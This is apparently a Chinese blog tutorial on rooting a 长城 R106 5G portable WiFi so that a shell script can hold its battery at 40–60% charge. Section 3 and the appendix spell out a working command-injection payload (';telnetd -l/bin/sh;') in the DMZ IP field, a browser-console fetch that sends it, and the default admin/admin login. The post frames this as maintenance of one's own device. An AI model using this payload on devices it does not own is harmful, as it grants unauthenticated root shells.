---
publishDate: 2026-10-06
draft: false
featured: true
title: "长城 R106 随身 WiFi 充电限制方案"
excerpt: "通过命令注入获取 root shell，定位 SGM4154X 充电芯片的软件投票与硬件使能两层控制节点，用守护脚本把电池电量钳制在 40%–60%，解决随身 WiFi 长期插电导致的鼓包问题。"
tags: ['嵌入式', '充电管理', 'sysfs', 'R106', '随身WiFi']
categories: ['embedded', 'hardware']
---

> 设备：长城 R106 5G 随身 WiFi（紫光展锐 UDX710 平台，SGM4154X 充电芯片）
>
> 目标：长期插电使用时，将电池电量控制在 40%–60%，防止高电量导致鼓包

---

## 目录

1. [背景与原理](#1-背景与原理)
2. [总体思路](#2-总体思路)
3. [第一步：获取 Shell 权限](#3-第一步获取-shell-权限)
4. [第二步：定位充电控制节点](#4-第二步定位充电控制节点)
5. [第三步：软件层停充的坑](#5-第三步软件层停充的坑)
6. [第四步：硬件级停充](#6-第四步硬件级停充)
7. [第五步：自动控制脚本](#7-第五步自动控制脚本)
8. [第六步：开机自启](#8-第六步开机自启)
9. [第七步：验证与关闭 Telnet](#9-第七步验证与关闭-telnet)
10. [维护与调参](#10-维护与调参)
11. [故障排查](#11-故障排查)
12. [附录：APK 逆向发现](#12-附录apk-逆向发现)

---

## 1. 背景与原理

锂电池长期处于 100% 满电 + 高温状态时，正极材料氧化和电解液分解加速，产生气体导致鼓包。锂电池的最佳储存区间是 **40%–60% SOC**（约 3.7V–3.9V 开路电压）。部分品牌平板/手机内置了"电池保护模式"（如限制在 40%–69%），但大多数随身 WiFi 设备没有该功能，只能一直充到 100%。

本方案的核心原理：在 Linux 系统中，充电芯片通过 **sysfs** 节点暴露控制接口。运行一个守护脚本，周期性读取电量，达到上限时关闭充电芯片使能位，低于下限时重新打开，从而把电量钳制在目标区间。

---

## 2. 总体思路

```
┌──────────────────────────────────────────────────────────────┐
│ 原厂后台 DMZ 设置存在命令注入漏洞                                │
│                          ↓                                    │
│ 注入 ";telnetd -l/bin/sh;" 启动 telnetd，获得 root shell       │
│                          ↓                                    │
│ 分析 /sys/class/power_supply/ 与已装多功能后台的二进制          │
│                          ↓                                    │
│ 找到两层控制节点：                                              │
│   ① charger-manager/stop_charge （软件投票）                   │
│   ② sgm4154x-charger/charge_enabled （硬件使能）              │
│                          ↓                                    │
│ 编写循环脚本：≥60% 停充，≤40% 恢复                             │
│                          ↓                                    │
│ 写入 /etc/init.d/hostname.sh 实现开机自启                      │
└──────────────────────────────────────────────────────────────┘
```

**关键教训**：只写软件层 `stop_charge` 时，界面显示 `Not charging` 但充电电流仍有 ~480 mA —— 充电芯片 SGM4154X 按自身硬逻辑继续充电。**必须同时拉低芯片的 `charge_enabled` 硬件使能位，才能真正切断充电回路。**

---

## 3. 第一步：获取 Shell 权限

### 3.1 漏洞原理

设备原厂 Web 后台的 DMZ 设置接口 `/action/router_set_dmz_params` 未对 `rt_dmz_ip` 参数做过滤，该参数最终被拼入 shell 命令执行，形成命令注入。

### 3.2 操作步骤

1. 电脑连接设备 WiFi，浏览器登录原厂后台（地址为 `http://192.168.1.1`，默认用户名/密码均为 `admin`）。

2. 进入 **安全设置 → DMZ**。

3. 在 DMZ IP 输入框填入载荷并点击"应用"：

   ```
   ;telnetd -l/bin/sh;
   ```

4. 等待 2–3 秒，把 DMZ IP 改回正常地址（如 `192.168.1.100`）再次应用，避免影响网络转发。

5. Windows 启用并运行 telnet 客户端：

   ```powershell
   dism /online /Enable-Feature /FeatureName:TelnetClient
   telnet 192.168.1.1
   ```

6. 出现 `sh-4.4#` 即获得 root shell。

> 注意：telnetd 是临时启动的，设备重启后自动关闭，需要重新注入。

### 3.3 无界面时的替代方法（浏览器控制台）

若后台页面隐藏了 DMZ 菜单，可在已登录的浏览器页面按 F12，于 Console 直接调用接口：

```javascript
fetch('/action/router_set_dmz_params', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({rt_dmz_switch: 'enable', rt_dmz_ip: ';telnetd -l/bin/sh;'})
}).then(r => r.text()).then(console.log)
```

> PowerShell 直接 POST 会失败：该后台登录密码经 `encryption.js` 的 `password_encode()` 加密（secret+时间戳），未携带正确会话将返回登录跳转页。

---

## 4. 第二步：定位充电控制节点

### 4.1 枚举电源设备

```sh
# ls /sys/class/power_supply/
ac  battery  sc27xx-fgu  sgm4154x-charger  usb  wireless
```

| 节点 | 含义 |
|---|---|
| `battery` | 展锐 charger-manager 聚合的电池信息 |
| `sgm4154x-charger` | 圣邦微 SGM4154X 充电芯片本体 |
| `sc27xx-fgu` | 展锐 SC27XX 电量计（Fuel Gauge Unit） |

读取关键信息：

```sh
cat /sys/class/power_supply/battery/capacity      # 电量百分比  → 100
cat /sys/class/power_supply/battery/status        # 充电状态    → Full
```

### 4.2 从已装后台反查控制节点

设备上已安装第三方"多功能后台"（位于 `/home/root/r106/`，由社区 APK 刷入），其电池页有"停止充电"开关。通过 `strings` 分析其服务程序即可找到开关背后的真实命令：

```sh
# ls /home/root/r106/
at_server  html  start.sh

# strings /home/root/r106/at_server | grep -i charg
disable_charge
echo 1 >/sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
echo 0 >/sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
```

网页侧调用链（佐证）：

```js
// /home/root/r106/html/js/settings.js
function disable_charge(){
    var disable_charge = $('#disable_charge').is(":checked") ? 1 : 0;
    $.get({url: "/api/batw?disable_charge="+disable_charge, ...});
}
```

> BusyBox 环境下 `head -30` 会报错，必须写成 `head -n 30`。

---

## 5. 第三步：软件层停充的坑

最初只操作 charger-manager 的投票节点：

```sh
echo 1 > /sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
```

结果：

- `battery/status` 变为 `Not charging`（UI 也显示停止）✓
- 但电池页"当前充电电流"仍显示 **480 mA** ✗

**原因**：charger-manager 的 `stop_charge` 只是 Linux 充电策略框架里的一路"软件投票"。SGM4154X 充电芯片在 USB 插入、电池电压低于其硬件阈值时，会按芯片自身的硬逻辑继续补充电流，软件状态机的标记并不能切断物理充电回路。部分充电芯片甚至在电池欠压时强制充电且无法关闭。

---

## 6. 第四步：硬件级停充

枚举充电芯片节点：

```sh
# ls /sys/class/power_supply/sgm4154x-charger/
capacity   charge_enabled   charge_type   constant_charge_current
constant_charge_voltage_max   health   input_current_limit
manufacturer   model_name   online   present   status   usb_type ...
```

直接写芯片使能位：

```sh
echo 0 > /sys/class/power_supply/sgm4154x-charger/charge_enabled
```

等待 2–3 分钟后观察：充电电流从 480 mA 降到接近 **0 mA** —— 硬件级停充有效。

| 层级 | 节点 | 停充 | 恢复 | 作用 |
|---|---|---|---|---|
| 软件层 | `.../charger-manager/.../charger.0/stop_charge` | `echo 1` | `echo 0` | 策略投票，同步后台 UI |
| 硬件层 | `sgm4154x-charger/charge_enabled` | `echo 0` | `echo 1` | 关闭芯片使能，真正断流 |

两层同时操作：UI 显示正确 + 物理回路真实切断。

---

## 7. 第五步：自动控制脚本

### 7.1 设计要点

- **滞回区间（hysteresis）**：上限 60%、下限 40%，避免在阈值附近频繁开关。
- 每 60 秒检查一次，资源占用可忽略。
- 读取值做数字校验（`case` 匹配纯数字），防止节点读空导致 shell 语法错误。
- **脚本内不使用中文注释**：telnet 粘贴多字节字符会被截断导致脚本报错（实测踩坑）。

### 7.2 部署

重新挂载根分区可写，用 heredoc 创建脚本：

```sh
mount -rw -o remount /

cat > /home/root/charge_limit.sh <<'EOF'
#!/bin/sh
UP=60
LOW=40
NODE1=/sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
NODE2=/sys/class/power_supply/sgm4154x-charger/charge_enabled
CAP=/sys/class/power_supply/battery/capacity
while true; do
  c=$(cat $CAP 2>/dev/null)
  case "$c" in
    ''|*[!0-9]*) ;;
    *)
      if [ "$c" -ge $UP ]; then
        echo 1 > $NODE1
        echo 0 > $NODE2
      fi
      if [ "$c" -le $LOW ]; then
        echo 0 > $NODE1
        echo 1 > $NODE2
      fi
      ;;
  esac
  sleep 60
done
EOF

chmod +x /home/root/charge_limit.sh
```

立即启动（后台运行）：

```sh
/home/root/charge_limit.sh &
```

### 7.3 工作状态转换

```
                         capacity ≥ 60%
          ┌──────────────────────────────────┐
          │                                  ▼
   [ 充电中 / CHARGING ]                [ 已停充 / STOPPED ]
   stop_charge=0                        stop_charge=1
   charge_enabled=1                     charge_enabled=0
          ▲                                  │
          └──────────────────────────────────┘
                         capacity ≤ 40%
```

---

## 8. 第六步：开机自启

该固件使用 SysV init，第三方后台本身就是通过追加一行到 `/etc/init.d/hostname.sh` 实现自启的。沿用同一位置：

```sh
echo '/home/root/charge_limit.sh &' >> /etc/init.d/hostname.sh
cat /etc/init.d/hostname.sh
```

文件末尾应包含两行：

```sh
/home/root/r106/start.sh &
/home/root/charge_limit.sh &
```

---

## 9. 第七步：验证与关闭 Telnet

### 9.1 功能验证

```sh
cat /sys/devices/platform/charger-manager/power_supply/battery/charger.0/stop_charge
# 期望: 1

cat /sys/class/power_supply/sgm4154x-charger/charge_enabled
# 期望: 0

cat /sys/class/power_supply/battery/status
# 期望: Not charging
```

重启验证持久化：

```sh
reboot
# 等待 1–2 分钟后重新 telnet，status 仍应为 Not charging
```

随后 1–2 天在 10086 后台电池页观察：60% 停充电流归零、40% 恢复充电。

### 9.2 关闭临时 telnetd

```sh
killall telnetd
exit
```

Windows 侧确认端口关闭：

```powershell
Test-NetConnection -ComputerName 192.168.1.1 -Port 23
# TcpTestSucceeded : False
```

或直接 `reboot`（telnetd 非自启，重启即消失）。

### 9.3 安全收尾

- 修改原厂后台默认/弱口令（默认账号密码均为 `admin`，请及时修改）。
- telnet 注入载荷仅用于自己设备的合法维护；DMZ 注入属于固件安全漏洞，设备不要暴露到公网。

---

## 10. 维护与调参

### 修改电量区间

```sh
vi /home/root/charge_limit.sh        # 或重新 cat > 覆盖
# 改 UP=xx LOW=yy
killall charge_limit.sh
/home/root/charge_limit.sh &
```

建议区间：

| 场景 | 区间 |
|---|---|
| 几乎纯插电、极少用电池 | 40–60% |
| 偶尔需要短时离电 | 45–70% |
| 长期储存（关机前） | 40–50% |

### 备用策略：限制满充电压

若某设备的充电芯片**不支持** `charge_enabled` 硬关闭（欠压即强制充电），可尝试压低恒压阈值，使其永远到不了满电高压区（SGM4154X 节点，单位 µV，写入前先 `cat` 原值记录）：

```sh
cat /sys/class/power_supply/sgm4154x-charger/constant_charge_voltage_max
echo 4000000 > /sys/class/power_supply/sgm4154x-charger/constant_charge_voltage_max  # 4.00V
```

电压-电量大致对应：

| 电压 | 约等于 SOC |
|---|---|
| 4.20 V | 100% |
| 4.10 V | ~80% |
| 4.00 V | ~60–70% |
| 3.92 V | ~50% |
| 3.80 V | ~30–40% |

---

## 11. 故障排查

| 现象 | 原因 | 解决 |
|---|---|---|
| PowerShell POST DMZ 返回 HTML 登录页 | 未正确登录（密码前端加密） | 用已登录浏览器 F12 Console 发 fetch |
| telnet 23 端口连不上 | telnetd 重启后失效或注入未执行 | 重新执行 DMZ 注入 |
| `head -30` 报错 | BusyBox 语法差异 | 用 `head -n 30` |
| 脚本报 `=40: not found` 之类错误 | heredoc 中的中文注释被 telnet 粘贴截断 | 脚本仅用 ASCII，重新写入 |
| 显示 Not charging 但仍有充电电流 | 只做了软件层停充 | 增加 `echo 0 > sgm4154x-charger/charge_enabled` |
| 重启后脚本不在 | 根分区未持久化或未加自启 | 确认 `mount -rw -o remount /`，检查 hostname.sh 末尾两行 |
| 找不到 r106 后台目录 | 设备未刷多功能后台 | 用 `find / -name start.sh` 或直接用 sysfs 节点，本方案不依赖后台 |

---

## 12. 附录：APK 逆向发现

社区刷写工具（社区多功能后台 APK）使用 Go（gomobile）开发，包名 `r106/dmz`，关键字符串提取自 `libgojni.so`：

```
/action/router_set_dmz_params
{"rt_dmz_switch":"enable","rt_dmz_ip":"%s"}
;telnetd -l/bin/sh;
/action/get_mgdb_params
192.168.1.1   admin
```

其工作流：

1. 登录原厂 Web 后台（默认 `admin` / `admin`）；
2. POST DMZ 接口注入 `;telnetd -l/bin/sh;`；
3. 恢复 DMZ 为正常 IP；
4. telnet 连上后：屏蔽云控域名（`fota.redstone.net.cn`、`reportinfo.freewo.com.cn` → 127.0.0.1）、`mount -rw -o remount /`、下载并解压 `r106.tar.gz` 到 `/home/root/r106/`、向 `/etc/init.d/hostname.sh` 追加自启。

平台信息：

```
unisoc-initgc-distro udx710-module-marlin3e  (UNISOC/Spreadtrum UDX710)
BusyBox v1.27.2, ash (sh-4.4)
Charger IC: SGMicro SGM4154X
Fuel gauge: SPRD SC27XX FGU
```

---

## 最终成果

- 电量稳定钳制在 **40%–60%**，长期插电不再满电高压运行；
- 软件 + 硬件双层控制，UI 状态与真实电流一致；
- 开机自启、免维护；telnet 仅调试时临时开启。
